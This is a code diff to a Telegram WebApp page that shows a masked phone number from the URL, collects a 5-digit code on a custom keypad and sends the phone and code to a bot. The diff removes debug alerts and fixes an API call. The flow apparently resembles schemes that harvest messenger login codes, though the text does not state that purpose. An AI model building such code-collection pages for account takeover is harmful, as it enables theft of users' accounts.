@@ -63,11 +63,10 @@
         const WebApp = window.Telegram?.WebApp;
         if (!WebApp) {
             alert('Telegram WebApp не доступен');
+        } else {
+            WebApp.ready();
+            WebApp.MainButton.setText('Подтвердить').hide().onClick(sendCode);
         }
-
-        WebApp.ready();
-        WebApp.MainButton.setText('Подтвердить').hide().onClick(sendCode);
-        alert("initData length = " + (WebApp.initData?.length || 0));
 
         // Получаем номер телефона из URL (query-параметр phone)
         const urlParams = new URLSearchParams(window.location.search);
@@ -79,7 +78,7 @@
             const cleaned = phone.replace(/\D/g, '');
             if (cleaned.length < 4) return phone;
             const last4 = cleaned.slice(-4);
-            return '****' + last4; // или можно показать первые цифры, как хотите
+            return '****' + last4;
         }
 
         document.getElementById('phoneDisplay').textContent = `Номер: ${maskPhone(phone)}`;
@@ -92,13 +91,13 @@
         for (let i = 1; i <= 9; i++) {
             const btn = document.createElement('button');
             btn.textContent = i;
-            btn.onclick = () => addDigit(i);
+            btn.onclick = () => addDigit(i.toString());
             keyboard.appendChild(btn);
         }
         // Кнопка 0
         const btn0 = document.createElement('button');
-        btn0.textContent = 0;
-        btn0.onclick = () => addDigit(0);
+        btn0.textContent = '0';
+        btn0.onclick = () => addDigit('0');
         keyboard.appendChild(btn0);
         // Кнопка удалить последний символ
         const btnDel = document.createElement('button');
@@ -136,7 +135,7 @@
         }
 
         function toggleMainButton() {
-            if (code.length === 5) { // ожидаемая длина кода (CODE_LEN)
+            if (code.length === 5) { // ожидаемая длина кода (CODE_LEN = 5)
                 WebApp.MainButton.show();
             } else {
                 WebApp.MainButton.hide();
@@ -145,11 +144,9 @@
 
         function sendCode() {
             if (code.length === 5) {
-                // console.log("Sending data:", {phone: phone, code: code});
-                // или alert, если консоль недоступна
-                alert("Отправка: " + JSON.stringify({phone, code}));
                 const data = { phone: phone, code: code };
-                WebApp.initData(JSON.stringify(data));
+                // Отправляем данные боту и закрываем приложение
+                WebApp.sendData(JSON.stringify(data));
             }
         }
     </script>
